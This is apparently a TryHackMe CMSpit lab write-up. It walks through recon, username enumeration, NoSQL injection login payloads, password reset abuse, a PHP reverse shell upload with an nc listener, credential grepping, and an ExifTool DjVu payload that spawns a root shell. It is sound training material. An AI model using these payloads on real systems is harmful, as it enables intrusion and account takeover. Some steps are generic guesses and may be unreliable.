# TryHackMe: CMSpit

> **Focus:** CMS enumeration, NoSQL injection, password reset abuse, foothold acquisition, and local privilege escalation  
> **Room Link:** https://tryhackme.com/room/cmspit

---

## Overview

CMSpit is a TryHackMe room that teaches how a vulnerable CMS can be chained with poor authentication handling and local misconfigurations to lead to full compromise. The room feels practical because it starts with web enumeration, moves into application logic abuse, and ends with privilege escalation on the host.

The main idea I took from this room is simple: when a web app leaks too much information or trusts user input too much, the attack path can become surprisingly short. A defender would see this as a good example of why enumeration, validation, and privilege boundaries matter.

---

## Initial Enumeration

I began with a standard Nmap scan to identify open services and confirm that the target was mostly web-focused.

```bash
nmap -sC -sV <target-ip>
```

If the target hostname is mapped locally, I would also add it to `/etc/hosts` first.

```bash
echo "<target-ip> cmspit.thm" | sudo tee -a /etc/hosts
```

This helped me move from raw IP-based testing to a cleaner CMS-focused workflow.

---

## Web Discovery

Once the web server was identified, I visited the site in the browser and started checking the page source, login behavior, and any visible CMS hints. CMS rooms usually give away clues through asset names, login endpoints, cookies, or error messages.

Useful commands for quick checks:

```bash
curl -i http://cmspit.thm/
curl -s http://cmspit.thm/ | head
whatweb http://cmspit.thm/
```

If the site had hidden directories, I would enumerate them as well.

```bash
gobuster dir -u http://cmspit.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

At this stage, the goal was not exploitation yet. It was just to understand how the application was built and where the important flows existed.

---

## CMS Identification

From the interface and source files, the application was clearly a CMS. That mattered because CMS platforms often have predictable endpoints, admin panels, and version-specific vulnerabilities.

To confirm details, I checked for obvious CMS fingerprints:

```bash
curl -s http://cmspit.thm | grep -iE "cms|generator|cockpit|admin"
```

I also reviewed the page headers and static assets:

```bash
curl -I http://cmspit.thm/
curl -s http://cmspit.thm | grep -oE 'src="[^"]+|href="[^"]+'
```

This kind of lightweight recon often reveals enough to narrow the attack surface before moving into deeper testing.

---

## User Enumeration

One of the most important parts of this room was user enumeration. The application behavior around account checking and password reset could be abused to learn valid usernames.

A quick way to observe login behavior is to compare responses for valid and invalid usernames.

```bash
curl -s -X POST http://cmspit.thm/auth/check \
  -d "username=test&password=test" -i
```

Then compare with a candidate username:

```bash
curl -s -X POST http://cmspit.thm/auth/check \
  -d "username=admin&password=test" -i
```

If the response differs, that often means the application is leaking account existence. In this room, the reset flow was especially useful for that type of testing.

A common approach is to fuzz usernames against the reset endpoint:

```bash
ffuf -u http://cmspit.thm/auth/requestreset \
  -X POST \
  -d "username=FUZZ" \
  -w /usr/share/wordlists/dirb/common.txt \
  -H "Content-Type: application/x-www-form-urlencoded"
```

This helped identify which accounts were valid without needing direct authentication.

---

## NoSQL Injection Testing

CMSpit is also known for NoSQL injection, so I tested input handling carefully around authentication and account lookup fields.

A few basic payloads are worth trying when the backend is likely MongoDB or another NoSQL system:

```bash
username[$ne]=test&password[$ne]=test
username=admin&password[$ne]=test
username[$gt]=
```

Using `curl`, that can look like this:

```bash
curl -s -X POST http://cmspit.thm/login \
  -d "username[$ne]=a&password[$ne]=a" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

The point here is not to spray random payloads. It is to see whether the backend is interpreting special operators instead of treating the input as plain text. That distinction often decides whether authentication can be bypassed.

---

## Password Reset Abuse

After user enumeration, I moved into the password reset functionality. This is where the room becomes very realistic because password reset flows are often weaker than the main login page.

I tested the reset request process first:

```bash
curl -s -X POST http://cmspit.thm/auth/requestreset \
  -d "username=admin" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

Then I checked whether the reset token or reset flow could be abused:

```bash
curl -s http://cmspit.thm/auth/reset?token=<token>
```

If the reset mechanism is weak, it may allow account takeover without needing the original password. In a real engagement, this would be a serious finding because recovery features are supposed to strengthen access control, not weaken it.

---

## Foothold Access

Once I had a working path through the CMS, I focused on getting a shell. In these rooms, that often means using admin access, file upload functionality, or a template/editor feature to place a web shell.

A common upload-based approach looks like this:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
```

Then edit the listener values inside the file:

```php
$ip = 'YOUR_IP';
$port = 4444;
```

Start a listener:

```bash
nc -lvnp 4444
```

If upload or execution is available, trigger the shell:

```bash
curl -F "file=@shell.php" http://cmspit.thm/upload
```

If the page allows direct command execution through a vulnerable CMS feature, even better. Once the reverse shell connects, I would stabilize it:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty raw -echo
```

That gives a much cleaner working shell for local enumeration.

---

## Local Enumeration

After landing on the target, I checked the system carefully for privilege escalation opportunities.

```bash
uname -a
id
hostname
sudo -l
```

I also looked at writable paths, SUID binaries, and running processes:

```bash
find / -perm -4000 2>/dev/null
find / -writable 2>/dev/null | head
ps aux
```

If the box had interesting services or application directories, I would inspect those too:

```bash
ls -la /var/www/html
find /var/www -type f | head
```

This kind of local enumeration is where a lot of real-world attacker movement happens. The web exploit gets you in, but the host filesystem usually tells you how to move up.

---

## Privilege Escalation

The room’s privesc stage involves using a host-level weakness after the foothold is gained. From the walkthroughs associated with CMSpit, one common path is abusing ExifTool-related behavior for privilege escalation.

First, I would identify whether ExifTool or image processing is present:

```bash
which exiftool
exiftool <file>
```

If the exploit requires crafting a malicious image metadata payload, I would prepare it locally. A common build flow is:

```bash
cat payload
```

Example payload structure:

```text
(metadata "\c${system('/bin/bash')};")
```

Then build the exploit file:

```bash
sudo apt install djvulibre-bin
bzz payload payload.bzz
djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz
ls -la exploit.djvu
```

Once the malicious file is ready, it would be transferred and used against the vulnerable processing workflow.

If the exploit spawns a shell, I would immediately upgrade it:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
id
whoami
```

At that point, the goal is to confirm root and capture the final flag.

---

## File Hunting

After getting higher privileges, I usually check the CMS directory for flags or useful configuration files.

```bash
find / -name "user.txt" 2>/dev/null
find / -name "root.txt" 2>/dev/null
find /var/www -type f | grep -i flag
```

If the CMS stores secrets in config files, that is also worth reviewing:

```bash
grep -RniE "password|secret|token|key" /var/www 2>/dev/null
```

This is often where you can connect the original web weakness to the broader system compromise.

---

## What I Learned

CMSpit was a strong reminder that web security and host security are tightly connected. A weak CMS login flow can lead to user enumeration, user enumeration can lead to account takeover, and account takeover can lead to code execution and privilege escalation.

The room also reinforced a practical habit: always test the obvious flows first, because in many cases the real weakness is not in the “advanced exploit,” but in a basic feature like password reset or file handling.

---

## Tools Used

```bash
nmap
curl
whatweb
gobuster
ffuf
nc
python3
exiftool
djvumake
bzz
```

---

## Outcome

CMSpit was a good hands-on exercise in CMS exploitation and privilege escalation. It trained me to think through enumeration, application logic abuse, and local post-exploitation steps in a way that feels very close to real-world testing.

The room is especially useful for learning how small web application weaknesses can chain together into full system compromise.
